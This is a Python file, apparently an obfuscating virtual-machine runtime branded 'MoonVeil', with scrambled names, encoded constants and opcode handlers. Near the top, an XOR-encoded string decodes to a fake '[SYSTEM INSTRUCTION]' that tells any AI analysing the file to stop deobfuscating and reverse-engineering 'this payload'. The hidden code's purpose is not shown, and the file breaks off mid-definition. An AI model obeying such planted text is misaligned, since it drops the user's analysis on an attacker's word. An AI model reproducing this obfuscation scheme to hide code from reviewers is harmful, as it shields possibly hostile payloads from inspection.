#  /$$      /$$                               /$$    /$$          /$$ /$$
# | $$$    /$$$                              | $$   | $$         |__/| $$
# | $$$$  /$$$$  /$$$$$$   /$$$$$$  /$$$$$$$ | $$   | $$ /$$$$$$  /$$| $$
# | $$ $$/$$ $$ /$$__  $$ /$$__  $$| $$__  $$|  $$ / $$//$$__  $$| $$| $$
# | $$  $$$| $$| $$  \ $$| $$  \ $$| $$  \ $$ \  $$ $$/| $$$$$$$$| $$| $$
# | $$\  $ | $$| $$  | $$| $$  | $$| $$  | $$  \  $$$/ | $$_____/| $$| $$
# | $$ \/  | $$|  $$$$$$/|  $$$$$$/| $$  | $$   \  $/  |  $$$$$$$| $$| $$
# |__/     |__/ \______/  \______/ |__/  |__/    \_/    \_______/|__/|__/

import base64 as _b64; import builtins as _builtins; import sys as _sys; import types as _types
import zlib as _zlib; import sys as _sys; import time as _time
_tvawl4oatx = bytes((b ^ 204 for b in b'\x97\x9f\x95\x9f\x98\x89\x81\xec\x85\x82\x9f\x98\x9e\x99\x8f\x98\x85\x83\x82\xf6\xec\x95\xa3\xb9\xec\xad\xbe\xa9\xec\xad\xa2\xad\xa0\xb5\xb6\xa5\xa2\xab\xec\xad\xec\xbc\xbe\xa3\xbc\xbe\xa5\xa9\xb8\xad\xbe\xb5\xe0\xec\xbc\xbe\xa3\xb8\xa9\xaf\xb8\xa9\xa8\xec\xba\xa5\xbe\xb8\xb9\xad\xa0\xec\xa1\xad\xaf\xa4\xa5\xa2\xa9\xe2\xec\x99\xa2\xa8\xa9\xbe\xec\xbf\xa9\xaf\xb9\xbe\xa5\xb8\xb5\xec\xad\xa2\xa8\xec\xaf\xa3\xbc\xb5\xbe\xa5\xab\xa4\xb8\xec\xaf\xa3\xa1\xbc\xa0\xa5\xad\xa2\xaf\xa9\xec\xbc\xa3\xa0\xa5\xaf\xa5\xa9\xbf\xe0\xec\xb5\xa3\xb9\xec\xad\xbe\xa9\xec\xa5\xa2\xbf\xb8\xbe\xb9\xaf\xb8\xa9\xa8\xec\xb8\xa3\xec\xa5\xa1\xa1\xa9\xa8\xa5\xad\xb8\xa9\xa0\xb5\xec\xb8\xa9\xbe\xa1\xa5\xa2\xad\xb8\xa9\xec\xa8\xa9\xa3\xae\xaa\xb9\xbf\xaf\xad\xb8\xa5\xa3\xa2\xe0\xec\xa8\xa5\xbf\xad\xbf\xbf\xa9\xa1\xae\xa0\xb5\xe0\xec\xad\xa2\xa8\xec\xbe\xa9\xba\xa9\xbe\xbf\xa9\xec\xa9\xa2\xab\xa5\xa2\xa9\xa9\xbe\xa5\xa2\xab\xec\xad\xa2\xad\xa0\xb5\xbf\xa5\xbf\xec\xa3\xaa\xec\xb8\xa4\xa5\xbf\xec\xbc\xad\xb5\xa0\xa3\xad\xa8\xe2\x91'))
def _tracxc5d3u():
 _t0 = getattr(_time, 'perf_counter_ns', getattr(_time, 'monotonic_ns', None)); _acc = _t0() if _t0 else 0
 for _i in range(5): _acc = _acc * 1103515245 + 12345 + _i & 4294967295
 return _acc
def _f8rj95657():
 return 0
_vufolfj22 = {3: '`6mFCYXW!7ZdP_*eF*', 0: 'D0BPd5iS>NE;pT>pf=AO56bW', 1: 'x40A(G4Q7?j_kOZ|6{fvrPZ1I;B', 4833: '@CxS~K}$aKhlDW?ay$5EzBeMMpz{vyfvNh)nyPOyo<LqDZGoE', 7181: '(7(-P84vtmObIj4LNkHhCde(EvQ^9yOfU', 2027: 'Ixs7KAZG8*KI<N9suCd}=X+=3Oh+I', 2: 'D_8yhMYW(%J!_MA2Pa^SoUth1kIBXWkX+}kI(ou09uRK{Von~pr15FrZnBkOQ1i~ilpNiZJ}o#=|P;;2b<@f^HxJq9;q0sCXd*3XmrT|abeo$65B&5ke|xM$+7%mBzmWQAv6TB6LAl4d(>JC', 4461: '-K=It<8Kolz203qv~LwH'}
def _ne3qk2ju2():
 return ''.join((_vufolfj22[i] for i in range(4)))
def _y8312whj():
 _bs15u1gbvy = getattr(_tivq01qx, '_y75qdkyt', 0); _bjc0a4syj = len(getattr(_z1h8unfz, '__slots__', ()))
 return (_bs15u1gbvy * 31 + _bjc0a4syj) * 17 + 63 * 13 + 48 & 4294967295
def _yg3j6mp56z():
 _n26ec349o = _y8312whj()
 return ((3704424365 ^ _n26ec349o ^ 1979230376) + 24645895 ^ 1901898295) & 4294967295
def _jsch8u9k(data, key):
 out = bytearray(len(data)); cur = key
 for i, b in enumerate(data):
  dec = b ^ cur & 255; out[i] = dec; cur = (cur ^ dec) * 7353021 + 714299425 & 4294967295
 return bytes(out)
_LCG_A = 3965085; _LCG_C = 943849467; _LCG_S0 = 612512354
_ALPHABET = 'HM*C\n\\pP^1zcIrk?=2f/K[v4!]:ul{Y>J.%bNA6\'dX7woDZ<B(VjaQUE; -Fxqg$\t5LG+Re)W@y0\r,~"3t`8n}_#&m9iSshO|T'
def _d67d0xcs(item):
 if isinstance(item, tuple):
  if len(item) == 3 and item[0] == '_C_':
   t = item[1]
   if t == 71:
    s1, s2 = item[2]; return bytes((a ^ b for a, b in zip(s1, s2))).decode('utf-8')
   elif t == 41:
    s1, s2 = item[2]; return bytes((a + b & 255 for a, b in zip(s1, s2))).decode('utf-8')
   elif t == 95:
    st = _LCG_S0; raw = bytearray(len(item[2]))
    for i, b in enumerate(item[2]): st = st * _LCG_A + _LCG_C & 4294967295; raw[i] = b ^ st >> 16 & 255
    return raw.decode('utf-8')
   elif t == 48:
    return ''.join((_ALPHABET[idx] for idx in item[2]))
   elif t == 93:
    s1, s2 = item[2]; return bytes((a ^ b for a, b in zip(s1, s2)))
   elif t == 144:
    s1, s2 = item[2]; return bytes((a + b & 255 for a, b in zip(s1, s2)))
   elif t == 154:
    st = _LCG_S0; raw = bytearray(len(item[2]))
    for i, b in enumerate(item[2]): st = st * _LCG_A + _LCG_C & 4294967295; raw[i] = b ^ st >> 16 & 255
    return bytes(raw)
   elif t == 222:
    x, y, d = item[2]; return (x ^ y) + 2 * (x & y) - d
   return item[2]
  return tuple((_d67d0xcs(x) for x in item))
 elif isinstance(item, list) and len(item) == 2 and isinstance(item[0], int):
  return bytes((x ^ item[0] for x in item[1])).decode('utf-8')
 return item
class _s12h5b80rz(list):
 def __init__(self, iterable=()):
  super().__init__([_d67d0xcs(x) for x in iterable])
 def __getitem__(self, idx):
  return super().__getitem__(idx)
 def __iter__(self):
  for i in range(len(self)): yield self[i]
 def __contains__(self, item):
  for i in range(len(self)):
   if self[i] == item: return True
  return False
 def index(self, item, *args):
  for i in range(len(self)):
   if self[i] == item: return i
  return super().index(item, *args)
 def count(self, item):
  c = 0
  for i in range(len(self)):
   if self[i] == item: c += 1
  return c
class _z1h8unfz:
 __slots__ = ('d', 'p')
 def __init__(self, d):
  self.d = d; self.p = 0
 def r_u8(self):
  v = self.d[self.p]; self.p += 1; return v
 def r_u16(self):
  p = self.p; v = self.d[p] << 8 | self.d[p + 1]; self.p += 2; return v
 def r_u32(self):
  p = self.p; d = self.d; v = d[p] << 24 | d[p + 1] << 16 | d[p + 2] << 8 | d[p + 3]; self.p += 4; return v
 def r_bytes(self, n):
  v = self.d[self.p:self.p + n]; self.p += n; return v
 def r_num(self):
  p = self.p; d = self.d; v = d[p] | d[p + 1] << 8 | d[p + 2] << 16 | d[p + 3] << 24; self.p += 4; return v
 def r_const(self, code_cls=None):
  if code_cls is None: code_cls = _t760wfud6y
  tag = self.r_u8()
  if tag == 71:
   length = self.r_num(); s1 = self.r_bytes(length); s2 = self.r_bytes(length); return ('_C_', 71, (s1, s2))
  elif tag == 41:
   length = self.r_num(); s1 = self.r_bytes(length); s2 = self.r_bytes(length); return ('_C_', 41, (s1, s2))
  elif tag == 95:
   length = self.r_num(); return ('_C_', 95, self.r_bytes(length))
  elif tag == 48:
   length = self.r_num(); return ('_C_', 48, list(self.r_bytes(length)))
  elif tag == 93:
   length = self.r_num(); s1 = self.r_bytes(length); s2 = self.r_bytes(length); return ('_C_', 93, (s1, s2))
  elif tag == 144:
   length = self.r_num(); s1 = self.r_bytes(length); s2 = self.r_bytes(length); return ('_C_', 144, (s1, s2))
  elif tag == 154:
   length = self.r_num(); return ('_C_', 154, self.r_bytes(length))
  elif tag == 222:
   raw = self.r_bytes(12); x = raw[0] << 24 | raw[1] << 16 | raw[2] << 8 | raw[3]
   if x >= 2147483648: x -= 4294967296
   y = raw[4] << 24 | raw[5] << 16 | raw[6] << 8 | raw[7]
   if y >= 2147483648: y -= 4294967296
   d = raw[8] << 24 | raw[9] << 16 | raw[10] << 8 | raw[11]
   if d >= 2147483648: d -= 4294967296
   return ('_C_', 222, (x, y, d))
  elif tag == 137:
   return None
  elif tag == 23:
   return False
  elif tag == 216:
   return True
  elif tag == 135:
   p = self.p; d = self.d; self.p += 4; v = d[p] << 24 | d[p + 1] << 16 | d[p + 2] << 8 | d[p + 3]
   return v if v < 2147483648 else v - 4294967296
  elif tag == 80:
   p = self.p; d = self.d; self.p += 8; hi = d[p] << 24 | d[p + 1] << 16 | d[p + 2] << 8 | d[p + 3]
   lo = d[p + 4] << 24 | d[p + 5] << 16 | d[p + 6] << 8 | d[p + 7]; v = hi << 32 | lo
   return v if v < 9223372036854775808 else v - 18446744073709551616
  elif tag == 221:
   length = self.r_num(); return int.from_bytes(self.r_bytes(length), 'big', signed=True)
  elif tag == 100:
   import struct; return struct.unpack('>d', self.r_bytes(8))[0]
  elif tag == 141:
   length = self.r_num(); return self.r_bytes(length)
  elif tag == 228:
   count = self.r_num(); items = [self.r_const(code_cls) for _ in range(count)]; return tuple(items)
  elif tag == 63:
   length = self.r_num(); sub_reader = self.__class__(self.r_bytes(length)); return code_cls(sub_reader)
  elif tag == 196:
   key = self.r_u8(); length = self.r_num(); return [key, self.r_bytes(length)]
  elif tag == 101:
   length = self.r_num(); return self.r_bytes(length).decode('utf-8')
  elif tag == 34:
   idx = self.r_num(); return ('_CHILD_REF', idx)
  raise ValueError(f'Unknown tag: {tag}')
class _t760wfud6y:
 __slots__ = ('name', 'argcount', 'posonlyargcount', 'kwonlyargcount', 'flags', 'varnames', 'cellvars', 'freevars', 'names', 'consts', 'instructions')
 def __init__(self, reader):
  while reader.p < len(reader.d):
   sec_tag = reader.r_u8(); sec_len = reader.r_num(); sec_end = reader.p + sec_len
   if sec_tag == 73:
    _bf = reader.r_num(); self.argcount = _bf & 255; self.posonlyargcount = _bf >> 8 & 63
    self.kwonlyargcount = _bf >> 14 & 63; self.flags = _bf >> 20 & 65535
    _raw_name = reader.r_const(self.__class__)
    self.name = _d67d0xcs(_raw_name) if isinstance(_raw_name, (tuple, list)) else _raw_name
   if sec_tag == 64:
    _freevars_cnt = reader.r_num()
    self.freevars = _s12h5b80rz((reader.r_const(self.__class__) for _ in range(_freevars_cnt)))
   if sec_tag == 74:
    _c_cnt = reader.r_num()
    self.consts = _s12h5b80rz((reader.r_const(self.__class__) for _ in range(_c_cnt)))
   if sec_tag == 4:
    _cellvars_cnt = reader.r_num()
    self.cellvars = _s12h5b80rz((reader.r_const(self.__class__) for _ in range(_cellvars_cnt)))
   if sec_tag == 52:
    insn_bytes = reader.r_bytes(reader.r_num()); self.instructions = {}; pc = 22; pos = 0
    while pos < len(insn_bytes):
     op = (insn_bytes[pos] | insn_bytes[pos + 1] << 8) ^ 55600; fmt = insn_bytes[pos + 2]; pos += 3
     if fmt == 105:
      arg = None
     elif fmt == 185:
      arg = insn_bytes[pos]; pos += 1
     elif fmt == 96:
      arg = insn_bytes[pos] | insn_bytes[pos + 1] << 8; pos += 2
     elif fmt == 145:
      val = insn_bytes[pos] | insn_bytes[pos + 1] << 8 | insn_bytes[pos + 2] << 16 | insn_bytes[pos + 3] << 24
      arg = val if val < 2147483648 else val - 4294967296; pos += 4
     elif fmt == 167:
      a = insn_bytes[pos] | insn_bytes[pos + 1] << 8; b = insn_bytes[pos + 2] | insn_bytes[pos + 2 + 1] << 8
      arg = (a, b); pos += 4
     elif fmt == 199:
      a = insn_bytes[pos] | insn_bytes[pos + 1] << 8; b = insn_bytes[pos + 2] | insn_bytes[pos + 2 + 1] << 8
      c = insn_bytes[pos + 4] | insn_bytes[pos + 4 + 1] << 8; arg = (a, b, c); pos += 6
     self.instructions[pc] = (op, arg); pc += 5
   if sec_tag == 26:
    _names_cnt = reader.r_num()
    self.names = _s12h5b80rz((reader.r_const(self.__class__) for _ in range(_names_cnt)))
   if sec_tag == 7:
    _varnames_cnt = reader.r_num()
    self.varnames = _s12h5b80rz((reader.r_const(self.__class__) for _ in range(_varnames_cnt)))
   reader.p = sec_end
  for _qir32mcl4q, _himn0sfr, _ssh06u4r in [(53, 4725, 0), (90, 2294, 2), (53, 4049, 2), (54, 3294, None), (89, 494, 2), (36, 1138, 1)]:
   self.instructions[_qir32mcl4q] = (_himn0sfr, _ssh06u4r)
class _dp6t2dmof:
 EXCEPT = 1; FINALLY = 2; WITH = 3
class _dhp3m41ep5:
 __slots__ = ('type', 'handler_pc', 'stack_height', 'exit_fn')
 def __init__(self, type, handler_pc, stack_height, exit_fn=None):
  self.type = type; self.handler_pc = handler_pc; self.stack_height = stack_height; self.exit_fn = exit_fn
def _m75qhltb5c(code, args, kwargs, defaults=(), kw_defaults=None):
 kw_defaults = kw_defaults or {}; total_vars = len(code.varnames); fastlocals = [None] * total_vars
 posonly = code.posonlyargcount; total_pos = code.argcount; kwonly = code.kwonlyargcount
 has_varargs = bool(code.flags & 4); has_varkw = bool(code.flags & 8); n_args = len(args)
 if n_args > total_pos:
  if not has_varargs:
   raise TypeError(f"{code.name}() takes {total_pos} positional argument{('s' if total_pos != 1 else '')} but {n_args} were given")
  for i in range(total_pos): fastlocals[i] = args[i]
  vararg_idx = total_pos + kwonly; fastlocals[vararg_idx] = tuple(args[total_pos:])
 else:
  for i in range(n_args): fastlocals[i] = args[i]
  if has_varargs: vararg_idx = total_pos + kwonly; fastlocals[vararg_idx] = ()
 if n_args < total_pos:
  n_defaults = len(defaults); def_start = total_pos - n_defaults
  for i in range(n_args, total_pos):
   def_idx = i - def_start
   if 0 <= def_idx < n_defaults: fastlocals[i] = defaults[def_idx]
 remaining_kwargs = dict(kwargs)
 for i in range(posonly):
  p_name = code.varnames[i]
  if p_name in remaining_kwargs:
   raise TypeError(f"{code.name}() got some positional-only arguments passed as keyword arguments: '{p_name}'")
 for i in range(posonly, total_pos):
  p_name = code.varnames[i]
  if p_name in remaining_kwargs:
   if i < n_args: raise TypeError(f"{code.name}() got multiple values for argument '{p_name}'")
   fastlocals[i] = remaining_kwargs.pop(p_name)
  elif i >= n_args:
   n_defaults = len(defaults); def_start = total_pos - n_defaults; def_idx = i - def_start
   if not 0 <= def_idx < n_defaults:
    raise TypeError(f"{code.name}() missing required positional argument: '{p_name}'")
 for i in range(n_args, posonly):
  n_defaults = len(defaults); def_start = total_pos - n_defaults; def_idx = i - def_start
  if not 0 <= def_idx < n_defaults:
   raise TypeError(f"{code.name}() missing required positional argument: '{code.varnames[i]}'")
 for i in range(total_pos, total_pos + kwonly):
  p_name = code.varnames[i]
  if p_name in remaining_kwargs:
   fastlocals[i] = remaining_kwargs.pop(p_name)
  elif p_name in kw_defaults:
   fastlocals[i] = kw_defaults[p_name]
  else:
   raise TypeError(f"{code.name}() missing required keyword-only argument: '{p_name}'")
 if has_varkw:
  kwarg_idx = total_pos + kwonly + (1 if has_varargs else 0); fastlocals[kwarg_idx] = remaining_kwargs
 elif remaining_kwargs:
  unexpected = next(iter(remaining_kwargs))
  raise TypeError(f"{code.name}() got an unexpected keyword argument '{unexpected}'")
 return fastlocals
class _aj6lostz3:
 __slots__ = ('m', 'b', 'l')
 def __init__(self, m, b, l):
  self.m = m; self.b = b; self.l = l
 def __getitem__(self, i):
  if isinstance(i, slice):
   start, stop, step = i.indices(self.l); return [self.m[self.b + x] for x in range(start, stop, step)]
  if i < 0: i += self.l
  if not 0 <= i < self.l: raise IndexError('list index out of range')
  return self.m[self.b + i]
 def __setitem__(self, i, v):
  if isinstance(i, slice):
   start, stop, step = i.indices(self.l); indices = list(range(start, stop, step)); v_list = list(v)
   if step == 1:
    delta = len(v_list) - len(indices)
    if delta > 0:
     for k in range(self.l - 1, stop - 1, -1): self.m[self.b + k + delta] = self.m[self.b + k]
    elif delta < 0:
     for k in range(stop, self.l): self.m[self.b + k + delta] = self.m[self.b + k]
     for k in range(self.l + delta, self.l): self.m[self.b + k] = None
    for idx_k, item in enumerate(v_list): self.m[self.b + start + idx_k] = item
    self.l += delta
   else:
    if len(indices) != len(v_list):
     raise ValueError('attempt to assign sequence to extended slice of different size')
    for idx_k, item in zip(indices, v_list): self.m[self.b + idx_k] = item
   return
  if i < 0: i += self.l
  if not 0 <= i < self.l: raise IndexError('list assignment index out of range')
  self.m[self.b + i] = v
 def __len__(self):
  return self.l
 def __bool__(self):
  return self.l > 0
 def __iter__(self):
  for i in range(self.l): yield self.m[self.b + i]
 def append(self, v):
  self.m[self.b + self.l] = v; self.l += 1
 def extend(self, it):
  for x in it: self.append(x)
 def index(self, item, *args):
  for i in range(self.l):
   if self.m[self.b + i] == item: return i
  raise ValueError(str(item) + ' is not in list')
 def __contains__(self, item):
  for i in range(self.l):
   if self.m[self.b + i] == item: return True
  return False
class _yr3sncll:
 __slots__ = ('m', 'b', 'd', 'p')
 def __init__(self, m, b, d):
  self.m = m; self.b = b; self.d = d; self.p = b
 def __len__(self):
  return (self.p - self.b) * self.d
 def __bool__(self):
  return self.p != self.b
 def append(self, v):
  self.m[self.p] = v; self.p += self.d
 def extend(self, it):
  for x in it: self.append(x)
 def __iadd__(self, it):
  for x in it: self.append(x)
  return self
 def pop(self, i=-1):
  L = self.__len__()
  if L == 0: raise IndexError('pop from empty list')
  if i == -1 or i == L - 1: self.p -= self.d; v = self.m[self.p]; self.m[self.p] = None; return v
  if i < 0: i += L
  if not 0 <= i < L: raise IndexError('pop index out of range')
  v = self.m[self.b + i * self.d]
  for k in range(i, L - 1): self.m[self.b + k * self.d] = self.m[self.b + (k + 1) * self.d]
  self.p -= self.d; self.m[self.p] = None; return v
 def insert(self, i, v):
  L = self.__len__()
  if i < 0: i += L
  if i < 0: i = 0
  if i > L: i = L
  for k in range(L, i, -1): self.m[self.b + k * self.d] = self.m[self.b + (k - 1) * self.d]
  self.m[self.b + i * self.d] = v; self.p += self.d
 def __getitem__(self, i):
  L = self.__len__()
  if isinstance(i, slice):
   start, stop, step = i.indices(L); return [self.m[self.b + x * self.d] for x in range(start, stop, step)]
  if i < 0: i += L
  if not 0 <= i < L: raise IndexError('list index out of range')
  return self.m[self.b + i * self.d]
 def __setitem__(self, i, v):
  L = self.__len__()
  if isinstance(i, slice):
   start, stop, step = i.indices(L); indices = list(range(start, stop, step)); v_list = list(v)
   if step == 1:
    delta = len(v_list) - len(indices)
    if delta > 0:
     for k in range(L - 1, stop - 1, -1): self.m[self.b + (k + delta) * self.d] = self.m[self.b + k * self.d]
    elif delta < 0:
     for k in range(stop, L): self.m[self.b + (k + delta) * self.d] = self.m[self.b + k * self.d]
     for k in range(L + delta, L): self.m[self.b + k * self.d] = None
    for idx_k, item in enumerate(v_list): self.m[self.b + (start + idx_k) * self.d] = item
    self.p += delta * self.d
   else:
    if len(indices) != len(v_list):
     raise ValueError('attempt to assign sequence to extended slice of different size')
    for idx_k, item in zip(indices, v_list): self.m[self.b + idx_k * self.d] = item
   return
  if i < 0: i += L
  if not 0 <= i < L: raise IndexError('list assignment index out of range')
  self.m[self.b + i * self.d] = v
 def __delitem__(self, i):
  L = self.__len__()
  if isinstance(i, slice):
   start, stop, step = i.indices(L)
   if step == 1:
    to_remove = max(0, stop - start)
    if to_remove > 0:
     for k in range(stop, L): self.m[self.b + (k - to_remove) * self.d] = self.m[self.b + k * self.d]
     for k in range(L - to_remove, L): self.m[self.b + k * self.d] = None
     self.p -= to_remove * self.d
   else:
    indices = sorted(list(range(start, stop, step))); to_del = set(indices)
    new_items = [self.m[self.b + x * self.d] for x in range(L) if x not in to_del]
    for x, val in enumerate(new_items): self.m[self.b + x * self.d] = val
    for x in range(len(new_items), L): self.m[self.b + x * self.d] = None
    self.p = self.b + len(new_items) * self.d
   return
  if i < 0: i += L
  if not 0 <= i < L: raise IndexError('list assignment index out of range')
  for k in range(i, L - 1): self.m[self.b + k * self.d] = self.m[self.b + (k + 1) * self.d]
  self.p -= self.d; self.m[self.p] = None
 def __iter__(self):
  for i in range(self.__len__()): yield self.m[self.b + i * self.d]
 def clear(self):
  L = self.__len__()
  for i in range(L): self.m[self.b + i * self.d] = None
  self.p = self.b
 def copy(self):
  return [self.m[self.b + i * self.d] for i in range(self.__len__())]
class _scp39yth:
 __slots__ = ('val',)
 def __init__(self, val=None):
  self.val = val
class _tivq01qx(list):
 _y75qdkyt = 32
 def __init__(self, code, globals_dict, locals_dict=None, fastlocals=None, closure=None, func=None):
  super().__init__([None] * 4096); self[31] = code; self[28] = globals_dict
  self[10] = locals_dict if locals_dict is not None else globals_dict; self[11] = closure or ()
  self[12] = func; self[6] = self; self[27] = _aj6lostz3(self, 32, len(code.varnames))
  if fastlocals is not None:
   for i, v in enumerate(fastlocals): self[27][i] = v
  self[0] = _aj6lostz3(self, 160, 256); self[2] = _yr3sncll(self, 416, 1); self[4] = []
  for var in code.cellvars:
   init_val = None
   if var in code.varnames:
    v_idx = code.varnames.index(var)
    if v_idx < len(self[27]): init_val = self[27][v_idx]
   self[4].append(_scp39yth(init_val))
  if closure: self[4].extend(closure)
  self[5] = []; self[16] = None; self[7] = (22 ^ 54881) + 73; self[8] = None; self[3] = None; self[9] = []
  self[19] = 0; self[17] = 0; self[30] = 1979230376; self[26] = 1901898295; self[21] = 1979230376
  self[25] = 394334329; self[18] = 1901898295; self[1] = 1901037949
class _ez63j94b:
 def __init__(self, code, globals_dict, defaults=(), kw_defaults=None, closure=None):
  self.code = code; self.globals_dict = globals_dict; self.defaults = defaults
  self.kw_defaults = kw_defaults or {}; self.closure = closure or (); self._gbr3e910l1 = True
  self.__name__ = code.name; self.__qualname__ = code.name; self.__doc__ = None
  self.__defaults__ = defaults if defaults else None
  self.__kwdefaults__ = kw_defaults if kw_defaults else None; self.__closure__ = closure; self.__code__ = code
  self.__module__ = globals_dict.get('__name__', '__main__')
 def __get__(self, instance, owner=None):
  if instance is None: return self
  return _types.MethodType(self, instance)
 def execute_with_locals(self, locals_dict):
  f = _tivq01qx(self.code, self.globals_dict, locals_dict=locals_dict, closure=self.closure, func=self)
  return _oh0xfvl0(f)
 def __call__(self, *args, **kwargs):
  fastlocals = _m75qhltb5c(self.code, args, kwargs, self.defaults, self.kw_defaults)
  f = _tivq01qx(self.code, self.globals_dict, fastlocals=fastlocals, closure=self.closure, func=self)
  return _oh0xfvl0(f)
def _whjpx3rm(left, right, cmp_arg):
 if cmp_arg == 0:
  return left < right
 elif cmp_arg == 1:
  return left <= right
 elif cmp_arg == 2:
  return left == right
 elif cmp_arg == 3:
  return left != right
 elif cmp_arg == 4:
  return left > right
 elif cmp_arg == 5:
  return left >= right
 elif cmp_arg == 6:
  return left in right
 elif cmp_arg == 7:
  return left not in right
 elif cmp_arg == 8:
  return left is right
 elif cmp_arg == 9:
  return left is not right
 elif cmp_arg == 10:
  return isinstance(left, right) or (isinstance(left, type) and issubclass(left, right))
 return False
def _fmtcc8dkf(pairs):
 d = {}
 for i in range(0, len(pairs), 2): d[pairs[i]] = pairs[i + 1]
 return d
def _au39cjavb(name, globals_dict, builtins_dict, frame):
 if name in globals_dict:
  return globals_dict[name]
 elif name == 'super':
  def _q3iv8jfs(*args):
   if not args:
    if True and frame[12] and hasattr(frame[12], '__class_owner__') and frame[27]:
     return _builtins.super(frame[12].__class_owner__, frame[27][0])
   return _builtins.super(*args)
  return _q3iv8jfs
 elif builtins_dict and name in builtins_dict:
  return builtins_dict[name]
 raise NameError(f"name '{name}' is not defined")
_RET_SIGNAL = object()
def _xo508(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]] = registers[arg[1]] ^ registers[arg[2]]
def _xa496(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _l5y4w6v8 = stack.pop(); _nd2be60w = stack.pop(); stack.append(_nd2be60w - _l5y4w6v8)
def _xi523(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]] = registers[arg[1]] % registers[arg[2]]
def _xr951(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 val = stack.pop()
 if not val: frame[7] = (arg ^ 54881) + 73
def _xzf6b(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _q4afqxso = stack[-1]; stack[-1] = stack[-2]; stack[-2] = stack[-3]; stack[-3] = _q4afqxso
def _xz648(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 if arg == 2:
  upper = stack.pop(); lower = stack.pop(); stack.append(slice(lower, upper))
 elif arg == 3:
  step = stack.pop(); upper = stack.pop(); lower = stack.pop(); stack.append(slice(lower, upper, step))
def _xy665(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _d, _cr, _fl = arg; _co = registers[_cr]; _cl = []
 if _co.freevars:
  for _v in _co.freevars:
   if _v in frame[31].cellvars:
    _cl.append(frame[4][frame[31].cellvars.index(_v)])
   elif _v in frame[31].freevars:
    _cl.append(frame[4][len(frame[31].cellvars) + frame[31].freevars.index(_v)])
 _defs = registers[_d] if _fl & 1 else ()
 _kwdefs = (registers[_d + 1] if _fl & 1 else registers[_d]) if _fl & 2 else {}
 registers[_d] = _ez63j94b(_co, globals_dict, defaults=_defs or (), kw_defaults=_kwdefs or {}, closure=tuple(_cl))
def _xdeb0(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 right = stack.pop(); left = stack.pop(); stack.append(left ** right)
def _xcee8(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 right = stack.pop(); left = stack.pop(); stack.append(left @ right)
def _xdc02(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 stack.append(fastlocals[arg])
def _xcac6(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _o3s28mca = stack.pop(); _q181eie48 = stack.pop(); stack.append(_q181eie48 >> _o3s28mca)
def _xx899(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 right = stack.pop(); left = stack.pop(); stack.append(left | right)
def _xcd4b(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _vrqju8t5nt = stack.pop(); _k1zclryaw = stack.pop(); stack.append(_k1zclryaw | _vrqju8t5nt)
def _xye76(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 stack.append(getattr(stack[-1], names[arg]))
def _xu30e(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 frame[4][arg[0]].val = registers[arg[1]]
def _xl972(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _n00wzge2l = fastlocals[arg]; stack.append(_n00wzge2l)
def _dd85e(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 if frame is None: return None
 return (frame[7] - 73 ^ 54881 ^ 90) & 255
def _xga2f(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]] = getattr(registers[arg[1]], names[arg[2]])
def _xx4f7(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 if arg == 0:
  stack.append(set())
 else:
  items = set(stack[-arg:]); del stack[-arg:]; stack.append(items)
def _xp157(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _ri4dbokt = names[arg]; _u714ke3jx = globals_dict
 if _ri4dbokt in _u714ke3jx:
  _dsea4wn7q = _u714ke3jx[_ri4dbokt]; stack.append(_dsea4wn7q)
 elif _ri4dbokt == 'super':
  def _q3iv8jfs(*args):
   if not args:
    if True and frame[12] and hasattr(frame[12], '__class_owner__') and frame[27]:
     return _builtins.super(frame[12].__class_owner__, frame[27][0])
   return _builtins.super(*args)
  stack.append(_q3iv8jfs)
 elif builtins_dict and _ri4dbokt in builtins_dict:
  stack.append(builtins_dict[_ri4dbokt])
 else:
  raise NameError(f"name '{_ri4dbokt}' is not defined")
def _xgd8b(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _jsikuchksk = names[arg]
 if _jsikuchksk in locals_dict:
  stack.append(locals_dict[_jsikuchksk])
 elif _jsikuchksk in globals_dict:
  stack.append(globals_dict[_jsikuchksk])
 elif _jsikuchksk == 'super':
  def _q3iv8jfs(*args):
   if not args:
    if True and frame[12] and hasattr(frame[12], '__class_owner__') and frame[27]:
     return _builtins.super(frame[12].__class_owner__, frame[27][0])
   return _builtins.super(*args)
  stack.append(_q3iv8jfs)
 elif builtins_dict and _jsikuchksk in builtins_dict:
  stack.append(builtins_dict[_jsikuchksk])
 else:
  raise NameError(f"name '{_jsikuchksk}' is not defined")
def _xvf3e(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _d, _b, _c = arg
 registers[_d] = slice(registers[_b], registers[_b + 1]) if _c == 2 else slice(registers[_b], registers[_b + 1], registers[_b + 2])
def _xy2db(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 if not stack[-1]:
  frame[7] = (arg ^ 54881) + 73
 else:
  stack.pop()
def _xof19(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
